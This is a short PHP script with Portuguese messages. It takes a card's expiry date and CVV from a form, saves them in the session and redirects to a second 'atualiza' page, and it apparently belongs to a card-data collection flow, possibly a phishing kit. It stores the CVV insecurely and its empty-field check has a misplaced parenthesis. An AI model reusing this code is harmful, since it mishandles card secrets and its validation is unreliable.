<?php

session_start();

if(empty($_POST['val'] || empty($_POST['cvv2']))){


    $_SESSION['error'] = "Iforme todos os campos!";
    header('Location:atualiza.php');



}else{

    
    $validade = addslashes($_POST['val']);

    $cvv = addslashes($_POST['cvv2']);

    $_SESSION['validade'] = $validade;
    $_SESSION['cvv'] = $cvv;

    header('Location:atualiza2.php');

}









